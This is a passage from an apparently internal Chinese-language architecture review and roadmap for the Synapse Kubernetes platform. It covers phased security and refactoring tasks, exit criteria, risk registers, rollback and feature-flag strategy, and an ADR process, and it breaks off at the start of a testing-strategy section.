### 7.3 開源治理

- 建立 `CONTRIBUTING.md`、`CODE_OF_CONDUCT.md`、`SECURITY.md`
- Issue template + PR template
- 導入 Conventional Commits
- Release Please 自動化 changelog
- 公開 Roadmap GitHub Project

### 7.4 社群生態

- Plugin 機制：透過 WASM / gRPC 讓第三方擴充 UI + API
- Extension marketplace
- Theme 系統（客戶化品牌色）

---

## 八、分階段交付計畫

### Phase 0 — 急救（1~2 週）

> **🤖 主力模型**：Opus 30% / **Sonnet 55%** / Haiku 15%
> 安全關鍵設計（JWT jti/blacklist、SystemRole migration）用 Opus；P0 清單的實作替換用 Sonnet；批量文字替換（`username == "admin"` → 角色判定）用 Haiku。詳見 §十五.2。

**目標**：解除所有 P0 阻斷。

- [x] **P0-1** 移除 Salt 日誌輸出（2026-04-09 完成）
- [x] **P0-2** 新增 `SystemRole` 欄位 + migration + 替換所有 `username == "admin"`（2026-04-09 完成；6 處皆改 `IsPlatformAdmin()`）
- [x] **P0-3** 修復 `TestDeleteUserGroup_Success` 失敗測試，確保 `go test ./...` 綠燈（2026-04-09 完成）
- [x] **P0-5** 加入 `jti` 到 JWT，新增 `token_blacklist` 表 + blacklist middleware（2026-04-09 完成；含 iss/aud/nbf/iat、sync.Map 快取、登出寫入黑名單）
- [x] **P0-6** Token 移出 localStorage（先做到 memory 即可，cookie 留 Phase 1）（2026-04-09 完成；Access Token 僅存記憶體，重新整理後需重新登入）
- [x] 新增 `make check` target：`test + lint + vet + gosec`（2026-04-09 完成）
- [x] pre-commit hook 強制 `make check` 通過（2026-04-09 完成；`.githooks/pre-commit`）
- [x] 把 **本文件** 加入 `docs/ARCHITECTURE_REVIEW.md`（本次提交）

**交付物**：P0 清單全綠、CI 綠燈、Security incident 報告

### Phase 1 — 止血（4~6 週）

> **🤖 主力模型**：Opus 15% / **Sonnet 65%** / Haiku 20%
> Repository 介面設計 + 第一個試點檔（Opus 定調），其餘 Cluster/User/Permission 遷移與路由拆分依樣畫葫蘆（Sonnet）；swag 註解標註與 ErrorBoundary 樣板套用（Haiku）。詳見 §十五.2。

**目標**：解決 P0-4 與 P1 最重要事項。

- [x] **P0-4a** Repository 介面 + BaseRepository 抽象 + Feature Flag + ADR-0001 ✅（2026-04-09）
- [x] **P0-4b** Cluster / User / Permission 三個 domain 遷移到 Repository 層 ✅（2026-04-09）
- [x] **P0-4c** Repository pattern 推廣 ✅（40/40 完成，2026-04-10）
- [x] **P1-2** 路由拆分 ✅（14 個 routes\_\*.go 檔，router.go 293 行，2026-04-10）
- [x] **P1-3** Service Interface 化 ✅（PrometheusQuerier / OMQuerier / MeshQuerier，compile-time guard，2026-04-10）
- [x] **P1-4** 導入 swaggo/swag 產生 OpenAPI ✅（docs/swagger/swagger.json，18 routes，2026-04-10）
- [x] **P1-6** Axios timeout 分層 ✅（GET 60s / POST·PUT·DELETE 45s，2026-04-10）
- [x] **P1-7** 套用全域 ErrorBoundary ✅（2026-04-10；handleReload + retryLabel）
- [ ] **P1-9** 測試覆蓋率：service ≥ 30%、handler ≥ 20%
- [x] 建立 `docs/CONTRIBUTING.md` 與 Code Review Checklist ✅（含 PR 流程、前後端 checklist、測試與安全規範）

### Phase 2 — 體質改善（2~3 個月）

> **🤖 主力模型**：Opus 15% / **Sonnet 60%** / Haiku 25%
> Repository 全面推廣與 Handler 拆分（Sonnet + 範本）；OpenTelemetry 初始化設計與 migration 工具選型（Opus）；Axios timeout/前端批量 refactor（Haiku）。詳見 §十五.2。

- [ ] **P0-4c** Repository 層覆蓋到所有 40 個 handler（Batch 1/2/3 推廣，見 `docs/REFACTOR_HANDLER_GUIDE.md` §11）
- [x] **P1-1** Handler 拆分至 < 500 行/檔 ✅ (2026-04-10)
- [x] **P1-5** 前端頁面肥胖症 Top 10 頁面拆分 ✅（所有 > 700 行頁面與 service 已拆分，2026-04-11）
- [x] **P1-8** Redis RateLimiter 實作 ✅（RateLimiter interface + Memory/Redis 雙後端，2026-04-11）
- [ ] **P1-9** 測試覆蓋率：service ≥ 60%、handler ≥ 40%
- [x] **P1-10** OpenTelemetry 導入 ✅（otelgin + otelgorm + OTLP gRPC exporter，fail-open，2026-04-11）
- [x] **P2-4** golang-migrate 遷移取代 AutoMigrate ✅（MySQL 使用版本化 SQL 遷移，SQLite 保留 AutoMigrate，2026-04-11）
- [x] **P2-8** Informer 健康檢查 ✅（`HealthCheck() map[uint]InformerHealth`，`/readyz` 加入 k8s_informers 欄位，2026-04-11）

### Phase 3 — 擴展基礎（4~6 個月）

> **🤖 主力模型**：**Opus 30%** / Sonnet 55% / Haiku 15%
> 多租戶模型、欄位加密、審計雜湊鏈屬安全關鍵設計（Opus 全程主導）；Zustand 狀態管理導入與頁面改寫（Sonnet）；i18n 英文翻譯填值與 lazy loading route 套用（Haiku）。詳見 §十五.2。

- [x] **P2-1** Multi-tenant 能力 ✅（ADR-0009 Rejected：單組織內部運維平台，不實作多租戶，2026-04-11）
- [x] **P2-2** 審計日誌雜湊鏈 ✅（SHA-256 hash chain, AuditSink interface, DBSink, MultiSink, VerifyChain, migration 002, 2026-04-11）
- [x] **P2-3** 全面欄位加密 ✅（ArgoCDConfig/AIConfig/LogSourceConfig/CloudBillingConfig/HelmRepository/SIEMWebhookConfig/NotifyChannel 加 BeforeSave/AfterFind hooks；SystemSetting 敏感 blob 整體加密；encryptFields/decryptFields 共用 helper，2026-04-11）
- [x] **P2-5** Zustand 狀態管理 ✅（安裝 zustand ^5.0.12；建立 useSessionStore/useClusterStore/useUIStore；useSessionStore 接入 App.tsx useAuthInit；useClusterStore 接入 ClusterSelector.tsx；useUIStore 以 persist 儲存 sidebarCollapsed，2026-04-11）
- [x] **P2-6** Feature Flag DB-backed ✅（FeatureFlag model；features.DBStore 30s TTL + Invalidate；FeatureFlagService CRUD；GET/PUT /system/feature-flags；migration 003 預填 6 個已知 flag；startup features.SetStore() 替換 env store，2026-04-11）
- [x] **P2-7** i18n 英文完整化 ✅ 2026-04-12
- [x] **P2-8** K8s Informer 健康檢查 ✅（HealthCheck()+StartedAt；/readyz 整合；StartHealthWatcher 5分鐘自動重啟卡住 informer；4 個 unit test，2026-04-11）
- [x] **P2-9** Bundle size monitoring + lazy loading ✅（rollup-plugin-visualizer；check-bundle-size.mjs 12MB/3MB 預算；React.lazy 14 頁面；CI 步驟，2026-04-11）
- [x] 6.x 深化功能選擇 3 項實作 ✅（6.2 AI 根因分析 + 6.4 Secret 蔓延掃描 + 6.6 命名空間預算，2026-04-11）

### Phase 4 — 平台化（6~12 個月）

> **🤖 主力模型**：**Opus 35%** / Sonnet 55% / Haiku 10%
> Helm Chart HA、Synapse Operator、gRPC API、Plugin 機制均為跨檔案架構設計（Opus 主導）；Operator reconcile loop 與 Helm values 實作（Sonnet）；模板檔案化同步（Haiku）。詳見 §十五.2。

- [ ] Helm Chart HA 部署
- [ ] Synapse Operator
- [ ] 6.x 剩餘功能
- [ ] gRPC API 選擇性開放
- [ ] Plugin 機制試點

---

## 九、Phase Exit Criteria

每個 Phase 的「完成」必須以**可驗證的客觀標準**判定，而非「感覺差不多了」。以下為 Phase 0–4 的 Exit Criteria，作為 Stand-up / Review 會議的對照清單。若任一條件未滿足，不可進入下個 Phase。

### Phase 0 — 急救（1–2 週）

**功能性 Criteria：**

- [x] `go test ./...` 全綠（含 `TestDeleteUserGroup_Success`）
- [x] `go vet ./...` 無警告
- [x] `gosec -exclude-dir=vendor ./...` 無 HIGH 或 CRITICAL issue（2026-04-10 完成；8 項 false positive 加 #nosec，2 項 G115 補邊界檢查）
- [x] `grep -r "Printf.*salt"` 於 `internal/` 無結果（P0-1 驗證）
- [x] `grep -rn 'username == "admin"' internal/` 無結果（P0-2 驗證）
- [x] JWT 含 `jti` 欄位，`token_blacklist` 表存在（P0-5 驗證）
- [x] 前端 localStorage 已不儲存 access token（P0-6 驗證；至少 memory-only）

**流程 Criteria：**

- [x] `make check` target 存在並能執行（2026-04-09 完成）
- [x] `.githooks/pre-commit` 已啟用並驗證能攔截違規 commit（2026-04-09 完成）
- [x] 提交 Security incident 報告：列出 Phase 0 前已洩漏的敏感資料範圍與處置（`docs/security/SECURITY_INCIDENT_REPORT_PHASE0.md`）

**驗收會議：**

- 由 Platform Lead + Security Lead 共同簽核
- 附上 `go test`、`gosec`、`grep` 三項指令的完整輸出截圖

### Phase 1 — 止血（4–6 週）

**結構性 Criteria：**

- [x] Cluster / User / Permission 三個 domain 已走 Repository pattern，`internal/repositories/` 目錄存在 ✅
- [x] `grep -l '\*gorm.DB' internal/handlers/{cluster,user,permission}*.go` 無結果（DB 不再直接注入 handler）✅
- [x] `internal/router/routes_*.go` 檔案數 ≥ 10，`router.go` < 300 行 ✅（14 檔 / 293 行）
- [x] 前 3 大 service（prometheus / om / mesh）定義 interface 且 handler 持有 interface 而非 struct ✅
- [x] `make swag` 產生 `docs/swagger/swagger.json`，覆蓋 auth(6) / clusters(6) / users(6) ✅

**品質 Criteria：**

- [ ] Service 測試覆蓋率 ≥ 30%（`go test -cover ./internal/services/...`）
- [ ] Handler 測試覆蓋率 ≥ 20%
- [x] 前端 `ErrorBoundary` 已套用於 router 最外層 ✅
- [x] Axios 分層 timeout 已落地（GET 60s / mutation 45s）✅

**驗收會議：**

- 由 Platform Lead + Frontend Lead 共同簽核
- Demo：新人在沒有前置知識情況下，依據 OpenAPI 文件呼叫任一 cluster API 成功

### Phase 2 — 體質改善（2–3 個月）

**結構性 Criteria：**

- [x] 40 個 handler 全數走 Repository pattern，handler 平均行數 < 500（P0-4c 全部完成，2026-04-10）
- [ ] TOP 10 肥胖前端頁面拆分完成，平均行數 < 700
- [ ] Redis-backed RateLimiter 在多實例環境驗證過
- [ ] OpenTelemetry：`auth`、`cluster`、`workload` 三個 domain 的 trace 可在 Jaeger 看到完整 span
- [ ] `golang-migrate` 取代 AutoMigrate，`migrations/` 目錄下至少有 5 份版本檔
- [ ] Informer 健康檢查 metric 上線（`informer_last_sync_age_seconds`）

**品質 Criteria：**

- [ ] Service 測試覆蓋率 ≥ 60%
- [ ] Handler 測試覆蓋率 ≥ 40%
- [ ] 前端 `ui/src/` 有 Cypress / Playwright E2E 測試，至少 10 個關鍵使用流程
- [ ] Bundle size 基線報告存在（`pnpm build --report`），首屏 chunk < 500 KB gzipped

**驗收會議：**

- 由 Platform Lead + SRE Lead 共同簽核
- Demo：Redis 模式啟用下，兩個 Synapse 實例同時跑 rate limit 不失準

### Phase 3 — 擴展基礎（4–6 個月）

**結構性 Criteria：**

- [x] 多租戶（P2-1）決議文件已公告 ✅（ADR-0009 Rejected：單組織平台，不做多租戶，2026-04-11）
- [ ] 審計日誌 hash chain 上線；`audit_logs.prev_hash` 欄位存在
- [ ] `pkg/crypto` 的 KeyProvider 支援輪替，`rotate-key` CLI 已整合 pipeline / git token / registry cred / cluster kubeconfig
- [ ] Zustand / Jotai 其中之一作為全域狀態；React Query 已隔離 server state
- [ ] i18n：英文完整涵蓋所有頁面，CI 檢查 `missing keys` 為 0

**品質 Criteria：**

- [ ] Phase 3 功能選擇的 2~3 項 §6 深化功能，每項都有 ADR + Exit Criteria
- [ ] Bundle size 與 Phase 2 基線相比 < +15%（避免膨脹）
- [ ] 壓力測試：100 concurrent users + 5 clusters × 1000 pods 下，API P95 < 1s

**驗收會議：**

- 由 Platform Lead + Product Lead 共同簽核

### Phase 4 — 平台化（6–12 個月）

**交付性 Criteria：**

- [ ] Helm Chart 可供外部使用者部署 HA Synapse（3 replicas + PostgreSQL HA）
- [ ] Synapse Operator 至少管理 Backup、DB Migration、Version Upgrade 三種 CRD
- [ ] gRPC API 至少暴露 `Cluster`、`Workload` 兩個 service，並有 Buf.build schema registry
- [ ] Plugin 機制試點：至少 1 個外部 plugin 能透過 hook 擴充功能
- [ ] §6 剩餘深化功能完成比例 ≥ 70%

**生態 Criteria：**

- [ ] 外部貢獻者 ≥ 3 位（非團隊內部）
- [ ] `CONTRIBUTING.md` / `CODE_OF_CONDUCT.md` / `SECURITY.md` 完整
- [ ] 至少一篇技術部落格 + 一次社群演講

**驗收會議：**

- 由 Platform Lead + CTO 共同簽核

---

## 十、風險登記表

本節依 Phase 劃分風險，每條記錄格式：**風險描述 → 可能影響 → 發生機率（H/M/L）→ 影響度（H/M/L）→ 緩解計畫 → 追蹤負責人**。

進入每個 Phase 前必須 review 本表，Phase 結束時更新風險狀態（`Mitigated / Realized / Accepted`）。

### Phase 0 風險

| #    | 風險                                                           | 影響             | 機率 | 衝擊 | 緩解                                                                                                                                                  |
| ---- | -------------------------------------------------------------- | ---------------- | ---- | ---- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| R0-1 | 修 P0-1 Salt 日誌時，現場日誌中已有洩漏資料                    | 歷史憑證外洩     | H    | H    | ① 立刻發 Security Advisory ② 強制 rotate 所有現場使用者密碼 ③ 清除 log aggregator（ELK/Loki）中相關索引                                               |
| R0-2 | `SystemRole` 遷移時 username="admin" 使用者丟失權限            | 平台鎖死         | M    | H    | ① Migration script 必須先 `ALTER TABLE users ADD COLUMN system_role` + backfill `admin` → `SuperAdmin` ② Rollback SQL 預先備好 ③ 灰度：先在 dev DB 跑 |
| R0-3 | JWT jti 加入後舊 token 集體失效                                | 使用者被迫重登入 | H    | M    | ① 發佈公告，選在離峰時間上線 ② `token_blacklist` 表用 TTL 自動清理，避免無限成長 ③ 前端偵測 401 後 redirect 到登入頁，不顯示錯誤訊息                  |
| R0-4 | localStorage token 改 memory-only 後，使用者重新整理頁面被登出 | UX 回退          | H    | M    | ① Phase 0 接受此 trade-off，Phase 1 補 httpOnly cookie 方案 ② 前端加 loading state，避免看起來像錯誤                                                  |
| R0-5 | `make check` 導入後既有 PR 大量紅燈                            | 開發卡住         | H    | M    | ① 給所有 PR 一週寬限期 ② 分階段啟用：先 `go vet` → `gosec` → `test`                                                                                   |

### Phase 1 風險

| #    | 風險                                             | 影響           | 機率 | 衝擊 | 緩解                                                                                                            |
| ---- | ------------------------------------------------ | -------------- | ---- | ---- | --------------------------------------------------------------------------------------------------------------- |
| R1-1 | Repository 層導入改動巨大，merge conflict 連環爆 | 開發速度減半   | H    | H    | ① 試點 3 個 domain 而非全部 ② feature branch rebase 每日同步 main ③ 改動期間凍結對應 handler 的功能迭代         |
| R1-2 | Router 拆檔後路由註冊順序錯亂，middleware 掛不到 | API 認證失效   | M    | H    | ① 每個 `routes_*.go` 都有對應的 e2e smoke test ② `router_test.go` 驗證所有 route 都掛了 `AuthRequired` 或白名單 |
| R1-3 | Service interface 化後 mock 滿天飛，測試變難寫   | 測試覆蓋率下降 | M    | M    | ① 先在 Platform Lead 設計 mock 生成器（`gomock` or `mockery`）② 寫範例測試讓其他人抄                            |
| R1-4 | swaggo annotation 漏寫，OpenAPI 文件不完整       | 外部整合受阻   | H    | L    | ① CI 檢查 `swag init` 無 warning ② API changelog 納入 PR template                                               |
| R1-5 | ErrorBoundary 套上後吞掉原本的錯誤，難以除錯     | Debug 困難     | M    | M    | ① ErrorBoundary 必須呼叫 `reportError()` 送到後端 `/api/v1/logs/frontend` ② Dev mode 顯示完整 stack             |

### Phase 2 風險

| #    | 風險                                                                      | 影響               | 機率 | 衝擊 | 緩解                                                                                                                                         |
| ---- | ------------------------------------------------------------------------- | ------------------ | ---- | ---- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| R2-1 | Redis rate limiter 上線後 Redis 單點成瓶頸                                | 登入慢 / 429 異常  | M    | H    | ① Redis 必須用 cluster 模式或 sentinel ② RateLimiter 設計為介面，Redis fail 時 fallback 到 in-memory                                         |
| R2-2 | OpenTelemetry sampling 過高壓垮 Jaeger                                    | 追蹤丟失           | H    | M    | ① 採 1% head-based sampling + tail-based 在 error case 100% ② collector 前置 batch processor                                                 |
| R2-3 | `golang-migrate` 取代 AutoMigrate 時，現網 DB 狀態與 migration 版本不對齊 | Migration 失敗鎖死 | M    | H    | ① 先產生 `baseline.sql` 快照 ② 第一個 migration 標記為 `00000000_baseline.up.sql` = no-op ③ 現場資料庫先手動 insert `schema_migrations` 一列 |
| R2-4 | Handler 拆分導致 import cycle                                             | 無法 build         | L    | H    | ① 拆分前用 `go list -deps` 盤點依賴 ② 依照「handlers → services → models」嚴格分層，CI 加 `go-cleanarch` 檢查                                |
| R2-5 | 前端頁面拆分後 props drilling 過深                                        | 可讀性下降         | M    | M    | ① 拆分時同步引入 Context 或 Zustand ② Lint rule 禁止 props 超過 7 層                                                                         |

### Phase 3 風險

| #    | 風險                                           | 影響         | 機率 | 衝擊     | 緩解                                                                                                     |
| ---- | ---------------------------------------------- | ------------ | ---- | -------- | -------------------------------------------------------------------------------------------------------- |
| R3-1 | 多租戶改造觸及權限系統核心，造成跨租戶資料洩漏 | 安全事故     | M    | CRITICAL | ① 必須先寫 ADR 決定 Project 模型 ② 所有列表查詢強制 `tenant_id` where clause，CI 加 lint rule ③ 滲透測試 |
| R3-2 | 審計 hash chain 計算效能開銷過大               | API 變慢     | M    | M        | ① 非同步寫入 audit_logs ② hash 計算走 goroutine ③ benchmark 證明 < 5% overhead 才啟用                    |
| R3-3 | 全面欄位加密後現有明文資料需要 bulk migrate    | 停機時間長   | H    | H        | ① 雙寫模式：新寫加密，舊資料批次遷移 ② 遷移腳本可中斷續跑（checkpoint）③ 維護窗口外跑                    |
| R3-4 | 改用 Zustand 時既有 React Context 全部重寫     | 開發工時爆炸 | H    | M        | ① 分塊遷移：先 session / cluster / theme 三個 store ② 新寫一律用 Zustand，舊的留到自然迭代時改           |
| R3-5 | i18n 英文補齊時 key 命名衝突                   | 翻譯錯亂     | M    | L        | ① 先定義 key 命名規範（`domain.component.action`）② 自動化工具掃描 i18next 未使用的 key                  |

### Phase 4 風險

| #    | 風險                                               | 影響           | 機率 | 衝擊 | 緩解                                                                                      |
| ---- | -------------------------------------------------- | -------------- | ---- | ---- | ----------------------------------------------------------------------------------------- |
| R4-1 | Helm Chart HA 模式在多 DB 後 primary election 失敗 | 平台不可用     | M    | H    | ① PostgreSQL HA 走 CNPG operator 而非自建 ② Readiness probe 要能偵測 leader 狀態          |
| R4-2 | Operator CRD schema 改動破壞既有使用者             | Upgrade 失敗   | M    | H    | ① CRD conversion webhook ② 每次 CRD 變更 bump version（v1alpha1 → v1beta1）               |
| R4-3 | gRPC API 暴露後 schema 綁死，未來調整困難          | API 變動成本高 | H    | M    | ① 用 `Buf.build` 檢查 breaking change ② 明確標記 alpha API，版本升級前不承諾穩定          |
| R4-4 | Plugin 機制被濫用，plugin 執行時 crash 主程序      | 穩定性下降     | M    | H    | ① Plugin 走子 process + gRPC hashicorp/go-plugin ② 禁止 in-process plugin                 |
| R4-5 | 開源後收到 PR 品質參差，維護負擔暴增               | 團隊耗盡       | H    | M    | ① 嚴格的 Code Review Checklist ② `good first issue` 標籤引導新貢獻者 ③ 明確的拒絕理由模板 |

### 跨 Phase 持續性風險

| #    | 風險                                             | 緩解                                                     |
| ---- | ------------------------------------------------ | -------------------------------------------------------- |
| PR-1 | 關鍵人員離職導致知識流失                         | Pair programming + Project Brain 知識庫 + ADR 留痕       |
| PR-2 | 上游依賴（client-go、gin、gorm）breaking change  | 每月固定日 dependency 更新 + 完整 regression             |
| PR-3 | 客戶同時升級多版本 Synapse，migration 不向後相容 | migration 必須跨 N-2 版本相容，舊欄位保留 2 個 release   |
| PR-4 | 安全漏洞批量曝光（CVE 風暴）                     | 啟用 GitHub Dependabot + `govulncheck` 納入 `make check` |
| PR-5 | 本文件與現況分歧（文件腐壞）                     | 每季 review 一次，Exit Criteria 完成後立刻更新本文件     |

---

## 十一、遷移安全策略

大規模重構（P0-4 Repository、P1-2 Router 拆分、Phase 2 OpenTelemetry 等）都會有「程式改壞了但沒人發現」的風險。本節定義三種必備機制：**Canary、Feature Flag、Rollback**，作為所有大改動的預設護欄。

### 11.1 Canary / 灰度發布

**原則：** 任何影響 ≥ 5 個 handler / service 的重構，必須能「先在 10% 流量跑、看指標、再擴大」。

**實作路徑：**

- **單一 Synapse 實例時代**（目前狀態）：
  - 灰度以「feature flag + canary 使用者白名單」實作。
  - `internal/config/feature_flags.go` 持有一張 map：`flag_name → []user_id`。
  - 對應 handler 用 `if features.IsEnabled("use_repo_layer", userID)` 決定走新路徑。

- **多實例時代**（Phase 2 後）：
  - Gateway（nginx / traefik）依 request header `X-Canary: true` 或 cookie 分流。
  - Canary 實例單獨部署，指向相同 DB 但只接 10% 流量。
  - Canary 穩定 ≥ 7 天才全量。

**Metric 守門員：**

```
synapse_canary_error_rate < synapse_stable_error_rate * 1.5   # 錯誤率上升 > 50% 自動回滾
synapse_canary_latency_p95 < synapse_stable_latency_p95 * 1.2 # 延遲上升 > 20% 警告
```

**自動回滾規則：**

- 上線後 1 小時內錯誤率超閾值 → 自動降級 flag
- 需要 Platform Lead + SRE 兩人同意才能二次嘗試

### 11.2 Feature Flag

**模型選擇：** 不引入外部 flag 服務（LaunchDarkly / Unleash），避免新依賴。

**自實作規格：**

```go
// internal/features/features.go
package features

type Flag string

const (
    FlagRepositoryLayer Flag = "use_repo_layer"            // P0-4
    FlagRouteSplit      Flag = "use_split_router"          // P1-2
    FlagOTEL            Flag = "enable_otel_tracing"       // P1-10
    FlagRedisRateLimit  Flag = "use_redis_ratelimit"       // P1-8
    FlagZustand         Flag = "use_zustand_store"         // P2-5
    FlagHashChainAudit  Flag = "enable_audit_hashchain"    // P2-2
)

type Store interface {
    IsEnabled(flag Flag, ctx EvalContext) bool
}

type EvalContext struct {
    UserID     uint
    ClusterID  uint
    Percentage int       // 0~100 for percentage rollout
}
```

**三種 flag 來源（fallback 順序）：**

1. **Env var**（最高優先）：`SYNAPSE_FLAG_USE_REPO_LAYER=true`（CI / dev 用）
2. **DB 表** `feature_flags`：`(flag_name, enabled, rollout_pct, user_allowlist)`
3. **Code default**（最後兜底）：保守設為 `false`

**前端 flag：**

- 後端 `/api/v1/features` 回傳目前登入者的 flag set
- 前端 React hook `useFeature("use_repo_layer")` 讀取

**Flag 生命週期：**

- 每個 flag 必須設 **預期移除日期**（卡片描述必填）
- 超過移除日期 2 週仍未清理，自動開 `tech-debt` issue
- Phase 結束時強制清理該 Phase 引入的所有 flag（避免「永久 flag」腐蝕）

### 11.3 Rollback 策略

**分層 rollback：**

#### Layer 1：Flag Flip（秒級）

```bash
# 緊急時刻最快速的 rollback
curl -X POST http://synapse/admin/features \
  -H "Authorization: Bearer $ADMIN" \
  -d '{"flag":"use_repo_layer","enabled":false}'
```

適用於：程式碼層可切換的改動（repo layer、OTEL、ratelimit backend）

#### Layer 2：Binary Rollback（分鐘級）

```bash
# 換回前一版 binary / container image
kubectl set image deployment/synapse synapse=synapse:v1.17.0 -n synapse-system
```

適用於：Layer 1 無法覆蓋的程式改動（新 handler、UI 改動）

**前置條件：**

- 每版 binary 保留 ≥ 3 個歷史版本
- 每次 release 前跑完整 regression test
- Helm Chart 支援 `values.yaml` 的 `image.tag` override

#### Layer 3：Schema Rollback（小時級）

最危險的一種 — 只有迫不得已才用。

**前置條件：**

- 每次 schema migration 必須有 `down` 腳本（或說明「不可 rollback」）
- 生產 DB 有每日自動備份 + PITR（Point-In-Time Recovery）
- 遷移前手動快照：`pg_dump` 或雲端 DB snapshot

**Rollback 流程：**

1. 停止寫入流量（Maintenance mode）
2. 執行 `down` migration 或從快照 restore
3. 回退 binary 到對應版本
4. 驗證後恢復流量

**明確「不可 rollback」的情境：**

- 加密欄位輪替：一旦 rekey 完成，舊 key 已銷毀
- Hash chain 啟用後的 audit 記錄
- 任何涉及 **資料破壞性清理** 的 migration

這類 migration 必須在 ADR 中標記 `irreversible: true`，實作前 Platform Lead 必須簽核。

### 11.4 Change Freeze（變更凍結）

以下時段禁止合併**非 P0** 的變更：

- 每週五下午 16:00 之後
- 國定假日前 1 個工作天
- 大型客戶重大發布週
- Phase Exit Criteria 驗證期間

例外需 Platform Lead 書面批准（Slack / issue 留言即可）。

### 11.5 遷移演練（Migration Drill）

每個 Phase 進行中，至少 1 次在 dev 環境模擬：

- 從前一版本升級到當前版本
- 跑一次 rollback
- 記錄耗時、遇到的問題

演練報告存於 `docs/migration_drills/phase-N-YYYYMMDD.md`。

---

## 十二、ADR 機制與首批 ADR

### 12.1 ADR 是什麼

**Architecture Decision Record**：每個重要的設計決策記錄**當時的 Context、選擇、替代方案、後果**。目的：

- 半年後有人問「為什麼這樣設計」時有答案
- 新人 onboarding 時能快速理解「既有輪子為什麼長這樣」
- 當 Context 改變時（例如需求變了），可以有根據地重新討論

### 12.2 ADR 存放位置

`docs/adr/`

- `0001-repository-layer.md`
- `0002-jwt-revocation.md`
- `0003-router-split.md`
- ...

每個 ADR 獨立檔案，檔名格式：`NNNN-kebab-case-title.md`。

### 12.3 ADR 模板

```markdown
# ADR-NNNN: 標題

- **狀態：** Proposed / Accepted / Superseded / Deprecated（YYYY-MM-DD）
- **作者：** @username
- **相關 Phase / 任務：** Phase X / P0-Y

## Context

（為什麼有這個決策？什麼因素推動？）

## Decision

（我們決定做什麼？）

## Alternatives Considered

| 方案 | 否決原因 |
| ---- | -------- |
| A    | ...      |

## Consequences

- ✅ 好處
- ❌ 壞處 / 成本
- ⚠ 需要後續追蹤的事項

## References

- 相關 code 位置
- 相關 Issue / PR
- 相關外部文件
```

### 12.4 ADR 流程

1. **提議**：寫 `0000-proposal-xxx.md`（狀態 `Proposed`），PR 要求 review
2. **討論**：PR comment / review 會議討論，可能調整
3. **決議**：Platform Lead 合入，狀態改 `Accepted`，分配正式編號
4. **追蹤**：後續若需改變，新建 `Supersedes ADR-NNNN` 的 ADR，舊的改 `Superseded`
5. **不可修改**：Accepted 後的 ADR 原文不改動，只能以新 ADR 取代（保留歷史決策痕跡）

### 12.5 首批 ADR 建議撰寫順序

| 編號     | 狀態                                              | 標題                                                | 對應 Phase     | 優先 |
| -------- | ------------------------------------------------- | --------------------------------------------------- | -------------- | ---- |
| ADR-0001 | ✅ Accepted                                       | Repository 層導入與邊界                             | Phase 1 / P0-4 | P0   |
| ADR-0002 | Proposed                                          | SystemRole 取代 username == "admin"                 | Phase 0 / P0-2 | P0   |
| ADR-0003 | JWT Revocation 機制選型（黑名單 vs 短效+refresh） | Phase 0 / P0-5                                      | P0             |
| ADR-0004 | Router 拆分到 domain 檔案的模組邊界               | Phase 1 / P1-2                                      | P1             |
| ADR-0005 | Service Interface 化與 Mock 策略                  | Phase 1 / P1-3                                      | P1             |
| ADR-0006 | golang-migrate 取代 AutoMigrate                   | Phase 2 / P2-4                                      | P1             |
| ADR-0007 | Redis RateLimiter 的分散式模型                    | Phase 2 / P1-8                                      | P1             |
| ADR-0008 | OpenTelemetry 採樣策略                            | Phase 2 / P1-10                                     | P1             |
| ADR-0009 | ✅ Rejected                                       | Multi-Tenant Project 模型（決議：不做，單組織定位） | Phase 3 / P2-1 | P2   |
| ADR-0010 | Audit Hash Chain 演算法選型                       | Phase 3 / P2-2                                      | P2             |

> **Cross-reference：** 本文件外，`docs/CICD_ARCHITECTURE.md §21` 已收錄 9 條 CI/CD 專屬 ADR（編號 `ADR-001 ~ ADR-009`，獨立 namespace）。核心架構 ADR 走 `docs/adr/NNNN-*.md` 0000 系列，CI/CD ADR 保留在 CICD_ARCHITECTURE.md §21。兩者編號 namespace 不衝突，跨域引用時以全名 `ADR-0003` vs `CICD ADR-003` 區分。

> **補充：** 若評審議題直接涉及 Pipeline 執行模型，應以 `docs/CICD_ARCHITECTURE.md §7 / §17 / §21` 為準；該文件目前已收斂 Step=Job、PVC workspace、Step-scoped secret、chunked pipeline logs 與 M13a single-active controller 等 CI/CD 專屬決策。

### 12.6 ADR-0001 — 已落地（Repository 層導入）

ADR-0001 已於 **2026-04-09** 進入 `Accepted` 狀態，完整內容見：

- **`docs/adr/0001-repository-layer.md`**（權威文件，請以此為準）

關鍵摘要：

- **決策**：引入 `internal/repositories/` 層。`Repository[T any]` 介面定義 14 個方法；`BaseRepository[T]` 以 GORM 實作，每個方法強制 `.WithContext(ctx)`。錯誤用 `ErrNotFound` / `ErrAlreadyExists` / `ErrInvalidArgument` 三個 sentinel 對外，handler / service 不再看到 `gorm.ErrRecordNotFound`。
- **Feature Flag**：`FlagRepositoryLayer`（env `SYNAPSE_FLAG_USE_REPO_LAYER`），pilot 期間 service 同時持有舊路徑與新路徑，依 flag 切換；穩定後 2 週內清理。
- **試點範圍**：Phase 1 / P0-4b 動 Cluster / User / Permission 三個 domain；Phase 2 / P0-4c 推廣到剩餘 37 個 handler。
- **不採用替代方案**：直接把 DB 塞 Service（違反單一職責）／改用 ent/sqlc（遷移成本過大，不在本 Phase 預算）。
- **對應程式碼**：`internal/repositories/{repository,base,errors}.go`、`internal/features/features.go`、`internal/repositories/base_test.go`、`internal/features/features_test.go`。
- **對應操作文件**：`docs/REFACTOR_HANDLER_GUIDE.md`（Handler 遷移 12 步驟檢核表 + Pilot 3 domain 指引 + Feature Flag 準則 + 常見陷阱）。

未來若要修改 ADR-0001 的任何決策，不得直接改原文，需新建 `ADR-00NN` 並在新文件標示 `Supersedes ADR-0001`，原文保留以維持決策歷史。

---

## 十三、測試策略金字塔

目前測試覆蓋率偏低（P1-9），且沒有明確的測試分層策略。以下定義 Phase 2 結束時應達到的金字塔。

### 13.1 金字塔層級

```
       ╱╲
      ╱E2╲          5% — Playwright / Cypress（最關鍵使用流程）
     ╱────╲
    ╱ Intg ╲        20% — 真實 DB + real K8s fake client
   ╱────────╲
  ╱  Unit   ╲       75% — Service / Repo / utility 純邏輯測試
 ╱────────────╲
```

### 13.2 單元測試（Unit）

**範圍：** Service 方法、Repository 方法、純函式 util、前端元件 props 行為

**工具：**

- 後端：`testing` + `testify/assert` + `sqlmock` (DB mock) + `gomock`（interface mock）
- 前端：`vitest` + `@testing-library/react`

**規範：**

